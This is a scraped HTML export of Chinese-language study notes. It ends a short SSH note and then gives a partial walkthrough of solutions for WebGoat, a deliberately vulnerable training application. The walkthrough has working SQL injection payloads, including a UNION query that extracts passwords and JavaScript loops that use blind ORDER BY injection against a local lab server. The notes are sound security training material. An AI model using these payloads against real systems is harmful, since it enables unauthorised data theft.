d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"public-key\">Public Key<a href=\"#public-key\" class=\"hash-link\" aria-label=\"Public Key的直接連結\" title=\"Public Key的直接連結\">​</a></h3><p>在 Public Key 內容的最後，<strong>「空格」後的內容可以視為註解</strong>，因此可以隨意修改：</p><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCkiWTEB08rCV47ttssgiTqyrKtjUGOLudDftgGMLY0+ewrNOoKBEgutn/n4zvOqUCIytmQVi9kS/4gAb6xW4JUSop0Xl449r7XB9N1LT3xEF2Srldy0Vz3qijLX/9juQkju7GYUIw+EeyqNKgQhRoWZWN6dBjBPs+hb4GTKEX3g+P6yxEICbR+nc2AnvvhSpmNbFqDFGrU28Ak6+tKoHe7XDwyyNPj1/mx+qr6bY57V4rFO+XEiz9RlmZYKQLgQdg8Upf8aXVMtf1N43I+tIEjtOjJ7in5kTNyx49VQrWdodVQYiQHFyRLdWe8Aqk+9YbrS20tTdT8vcAXzX+1Z7G0D8Nqb9kEk2n1xDKZd7H13hO3ljp1lrnIkY8KhPb1lRBma6ssRMyjuHFAvAqEXzA6NJVK3iYgrPZws0arYobv0QTOpCEFfy+0lGBt/bQn8P9TCSyybJRqqY4lwGEPhyHFLP4uticyTkXZKeTwjt0wB1/J2nUcZs+1RIUIBjQ+5Sc1YMUcaBWEZ+A1gMFvOLuppboVu5y+OKUHYNRHfRZ9VCbtl5FKnJQRwjwkdJCw+VyCaY3BIGfD7Erb5bEO4f63ZKNP+Bc6eHNykB1m6gInajno5pxbgPK6XH84dhtGIb50kdtV/PFcA8IkU060xJw6Ci7ECyt7TOPk0fAhjeprEQ== pjchender@gmail.com</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"資料來源\">資料來源<a href=\"#資料來源\" class=\"hash-link\" aria-label=\"資料來源的直接連結\" title=\"資料來源的直接連結\">​</a></h2><ul><li><a href=\"https://www.ssh.com/ssh/command/\" target=\"_blank\" rel=\"noopener noreferrer\">SSH Command</a></li><li><a href=\"http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html\" target=\"_blank\" rel=\"noopener noreferrer\">SSH 原理與運用（一）：遠程登錄</a> @ 阮一峰的網絡日誌</li><li><a href=\"http://www.ruanyifeng.com/blog/2020/07/ssh-certificate.html\" target=\"_blank\" rel=\"noopener noreferrer\">SSH 證書登錄教程</a> @ 阮一峰的網絡日誌</li><li><a href=\"https://blog.chyang.me/2016/10/05/upgrade_your_ssh_keys/\" target=\"_blank\" rel=\"noopener noreferrer\">升級你的 SSH 金鑰！</a> @ Calvert&#x27;s murmur</li><li><a href=\"https://help.github.com/articles/connecting-to-github-with-ssh/\" target=\"_blank\" rel=\"noopener noreferrer\">Connecting to Github with SSH</a> @ Github</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [IS] WebGoat 參考解答 Solution pjchender.dev": {
    "prefix": "hinternet [IS] WebGoat 參考解答 Solution pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[IS] WebGoat 參考解答 Solution</h1></header><p>此篇筆記除自己實作外，另外也參考：</p><ul><li><a href=\"https://ithelp.ithome.com.tw/articles/10206165\" target=\"_blank\" rel=\"noopener noreferrer\">來玩 webgoat</a> - <a href=\"https://ithelp.ithome.com.tw/users/20107304/ironman/2006\" target=\"_blank\" rel=\"noopener noreferrer\">資安補漏洞，越補越大洞</a> @ iThome</li><li><a href=\"https://klarsen.net/?s=OWASP\" target=\"_blank\" rel=\"noopener noreferrer\">Klarsen.NET: OWASP</a></li><li><a href=\"http://www.xianxianlabs.com/2018/06/03/webgoat1/\" target=\"_blank\" rel=\"noopener noreferrer\">WEB 安全攻防靶場之 WEBGOAT</a> @ 鮮鮮實驗室</li></ul><blockquote><p>本篇更新時間： 2019-04-29</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"general\">General<a href=\"#general\" class=\"hash-link\" aria-label=\"General的直接連結\" title=\"General的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"http-basics\">HTTP Basics<a href=\"#http-basics\" class=\"hash-link\" aria-label=\"HTTP Basics的直接連結\" title=\"HTTP Basics的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q2\">Q2<a href=\"#q2\" class=\"hash-link\" aria-label=\"Q2的直接連結\" title=\"Q2的直接連結\">​</a></h4><p>輸入你的名字即可：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/4uTlGnl.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q3\">Q3<a href=\"#q3\" class=\"hash-link\" aria-label=\"Q3的直接連結\" title=\"Q3的直接連結\">​</a></h4><p>在 HTML 中可以找到此頁使用的 HTTP method 和 magic number：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/UffHtk2.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"http-proxies\">HTTP Proxies<a href=\"#http-proxies\" class=\"hash-link\" aria-label=\"HTTP Proxies的直接連結\" title=\"HTTP Proxies的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q6\">Q6<a href=\"#q6\" class=\"hash-link\" aria-label=\"Q6的直接連結\" title=\"Q6的直接連結\">​</a></h4><p>使用 OWASP 開啟 Chrome 瀏覽器後（設定方式請參考<!-- -->[WebGoat 學習筆記]<!-- -->(/Users/pjchen/Projects/Notes/source/<!-- -->_<!-- -->posts/Internet-MIS-IS/<!-- -->[IS]<!-- --> WebGoat 學習筆記.md)），按下送出攔截從 HTTP 送出的請求，然後進行竄改：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/egXTqsm.png\" alt=\"imgur\" class=\"img_ev3q\"></p><p>操作影片：</p><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">&lt;iframe width=&quot;570&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/-9XgCSZZrdw&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"injection-flaws\">Injection Flaws<a href=\"#injection-flaws\" class=\"hash-link\" aria-label=\"Injection Flaws的直接連結\" title=\"Injection Flaws的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"sql-injection\">SQL Injection<a href=\"#sql-injection\" class=\"hash-link\" aria-label=\"SQL Injection的直接連結\" title=\"SQL Injection的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q7\">Q7<a href=\"#q7\" class=\"hash-link\" aria-label=\"Q7的直接連結\" title=\"Q7的直接連結\">​</a></h4><p>輸入 <code>1&#x27; OR &#x27;1&#x27; = &#x27;1</code> 即可：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/xNPHJah.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q8\">Q8<a href=\"#q8\" class=\"hash-link\" aria-label=\"Q8的直接連結\" title=\"Q8的直接連結\">​</a></h4><p>輸入 <code>101 OR true</code> 即可：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/vM1Xnc8.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"sql-injection-advanced\">SQL Injection (Advanced)<a href=\"#sql-injection-advanced\" class=\"hash-link\" aria-label=\"SQL Injection (Advanced)的直接連結\" title=\"SQL Injection (Advanced)的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q3-1\">Q3-1<a href=\"#q3-1\" class=\"hash-link\" aria-label=\"Q3-1的直接連結\" title=\"Q3-1的直接連結\">​</a></h4><p>輸入 <code>&#x27; or 1=1 —</code> 即可：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/47c8ndS.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q3-2\">Q3-2<a href=\"#q3-2\" class=\"hash-link\" aria-label=\"Q3-2的直接連結\" title=\"Q3-2的直接連結\">​</a></h4><p>使用 <code>union</code> 把他和另一個 table 的資料合併出來顯示。</p><p>在 name 的 input 中輸入：</p><div class=\"language-sql codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sql codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27; UNION SELECT userid, user_name, password, &#x27;</span><span class=\"token plain\">number</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;, &#x27;</span><span class=\"token keyword\" style=\"font-style:italic\">type</span><span class=\"token plain\">&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> cookie</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">0</span><span class=\"token plain\">  </span><span class=\"token keyword\" style=\"font-style:italic\">FROM</span><span class=\"token plain\"> user_system_data </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">--</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>即可看到 dave 的密碼</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/rkUJkh3.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q5-未解\">Q5 未解<a href=\"#q5-未解\" class=\"hash-link\" aria-label=\"Q5 未解的直接連結\" title=\"Q5 未解的直接連結\">​</a></h4><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"sql-injection-mitigation\">SQL Injection (mitigation)<a href=\"#sql-injection-mitigation\" class=\"hash-link\" aria-label=\"SQL Injection (mitigation)的直接連結\" title=\"SQL Injection (mitigation)的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q8-1\">Q8<a href=\"#q8-1\" class=\"hash-link\" aria-label=\"Q8的直接連結\" title=\"Q8的直接連結\">​</a></h4><p>點選「排序」按鈕時，在 Network panel 會發現向後端打了一道 API</p><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">http://localhost:8080/WebGoat/SqlInjection/servers?column=ip</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p><code>ip</code> 的地方會帶到後端 SQL 中的 <code>ORDER BY</code>，我們可以透過 ORDER BY 的順序來猜測 IP：</p><ul><li><code>substring(ip,1,1)</code> 指的是 ip 欄位的從第一位數開始取一位的值</li><li>如果猜中了該 ip 的數字，則會以 <code>id</code> 排序，否則會以 <code>ip</code> 排序</li></ul><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// 檢查第一碼的 ip 是否等於 1</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">fetch</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token template-string template-punctuation string\" style=\"color:rgb(195, 232, 141)\">`</span><span class=\"token template-string string\" style=\"color:rgb(195, 232, 141)\">http://localhost:8080/WebGoat/SqlInjection/servers</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token template-string string\" style=\"color:rgb(195, 232, 141)\">  ?column=(case when exists(select id from servers where hostname=&#x27;webgoat-prd&#x27; and substring(ip,1,1)=</span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">${</span><span class=\"token template-string interpolation number\" style=\"color:rgb(247, 140, 108)\">1</span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token template-string string\" style=\"color:rgb(195, 232, 141)\">) then id else ip end)</span><span class=\"token template-string template-punctuation string\" style=\"color:rgb(195, 232, 141)\">`</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">then</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">response</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> response</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">json</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">then</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">result</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> </span><span class=\"token console class-name\" style=\"color:rgb(255, 203, 107)\">console</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">log</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token template-string template-punctuation string\" style=\"color:rgb(195, 232, 141)\">`</span><span class=\"token template-string string\" style=\"color:rgb(195, 232, 141)\">result - </span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">${</span><span class=\"token template-string interpolation number\" style=\"color:rgb(247, 140, 108)\">1</span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token template-string template-punctuation string\" style=\"color:rgb(195, 232, 141)\">`</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> result</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>可以使用迴圈的方式一次測試出某一位數的 IP 值：</p><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// 以下程式會檢查 ip 的第一碼多少</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token known-class-name class-name\" style=\"color:rgb(255, 203, 107)\">Array</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token keyword module\" style=\"font-style:italic\">from</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"> </span><span class=\"token literal-property property\">length</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">10</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">_</span><span class=\"token parameter punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token parameter\"> k</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> k</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">forEach</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">item</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">fetch</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token template-string template-punctuation string\" style=\"color:rgb(195, 232, 141)\">`</span><span class=\"token template-string string\" style=\"color:rgb(195, 232, 141)\">http://localhost:8080/WebGoat/SqlInjection/servers?column=(case when exists(select id from servers where hostname=&#x27;webgoat-prd&#x27; and substring(ip,1,1)=</span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">${</span><span class=\"token template-string interpolation\">item</span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token template-string string\" style=\"color:rgb(195, 232, 141)\">) then id else ip end)</span><span class=\"token template-string template-punctuation string\" style=\"color:rgb(195, 232, 141)\">`</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">then</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">response</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> response</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">json</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">then</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">result</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> </span><span class=\"token console class-name\" style=\"color:rgb(255, 203, 107)\">console</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">log</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token template-string template-punctuation string\" style=\"color:rgb(195, 232, 141)\">`</span><span class=\"token template-string string\" style=\"color:rgb(195, 232, 141)\">result - </span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">${</span><span class=\"token template-string interpolation\">item</span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token template-string template-punctuation string\" style=\"color:rgb(195, 232, 141)\">`</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> result</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>參考影片</p><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">&lt;iframe width=&quot;ˊ629&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/iaadW6OoP9U&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" 